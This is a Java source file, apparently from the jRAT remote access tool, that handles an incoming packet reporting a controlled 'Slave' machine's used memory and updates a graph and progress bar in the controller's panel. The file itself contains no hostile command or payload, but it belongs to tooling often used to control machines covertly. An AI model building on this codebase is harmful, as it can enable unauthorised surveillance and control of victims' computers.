package se.jrat.client.packets.incoming;

import java.io.DataInputStream;

import se.jrat.client.Slave;
import se.jrat.client.ui.frames.FrameControlPanel;
import se.jrat.client.ui.panels.PanelMemoryUsage;
import se.jrat.common.utils.MathUtils;


public class Packet24UsedMemory extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		long used = dis.readLong();
		
		FrameControlPanel frame = FrameControlPanel.instances.get(slave);
		
		if (frame != null) {
			PanelMemoryUsage panel = (PanelMemoryUsage) frame.panels.get("memory usage");

			if (panel != null) {
				panel.getGraph().addValues(used, slave.getMemory());

				if (frame.getTabbedPane().getTitleAt(1).equals("memory usage") && frame.getTabbedPane().getSelectedIndex() == 1) {
					panel.getGraph().repaint();
				}
				panel.getProgressBar().setValue(MathUtils.getPercentFromTotal(used, slave.getMemory()));
			}
		}

	}

}
